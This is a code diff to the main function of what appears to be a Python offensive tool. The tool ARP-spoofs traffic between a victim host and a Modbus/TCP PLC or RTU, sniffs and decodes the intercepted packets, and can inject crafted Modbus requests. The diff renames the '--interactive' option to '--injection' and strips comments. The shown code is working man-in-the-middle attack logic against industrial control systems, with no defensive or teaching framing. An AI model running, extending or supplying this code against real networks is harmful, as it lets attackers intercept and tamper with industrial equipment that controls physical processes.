@@ -300,7 +300,7 @@ def main():
     ap.add_argument("-t","--target", required=True, help="IP of the Modbus slave (PLC/RTU)")
     ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
     ap.add_argument("--log", help="Optional path to append decoded output to")
-    ap.add_argument("--interactive", type=bool, help="Craft your own Modbus request")
+    ap.add_argument("--injection", type=bool, help="Craft your own Modbus request")
     ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
     args = ap.parse_args()
 
@@ -313,7 +313,7 @@ def main():
     stop_event = threading.Event()
 
     crafted_pkt=""
-    if args.interactive:
+    if args.injection:
         crafted_pkt = interactive_packet_craft()
 
     try:
@@ -322,7 +322,7 @@ def main():
         log_line("[-] Error: "+str(e),log_file)
         exit(1)
 
-    own_mac = get_if_hwaddr(args.interface) # interface mac address
+    own_mac = get_if_hwaddr(args.interface) 
     victim_mac = get_mac(args.victim, args.interface)
     target_mac = get_mac(args.target, args.interface)
 
@@ -341,17 +341,14 @@ def main():
     spoof_thread.start()
     log_line("ARP spoofing started — traffic between victim and target now routes through this host.", log_file)
 
-    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" # TODO: make MAC address whitelist automatic
+    bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target}) and not ether src {own_mac}" 
 
-    # bpf_filter = f"tcp port {args.port} and (host {args.victim} or host {args.target})"
 
     mappings = {args.victim:victim_mac,args.target:target_mac}
 
     try:
         sniff(iface=args.interface, filter=bpf_filter,
               prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac,crafted_pkt), store=False)
-        # sniff(iface=args.interface,
-        #       prn=lambda p: handle_packet(p, args.port, log_file), store=False)
     except KeyboardInterrupt:
         pass
     finally:
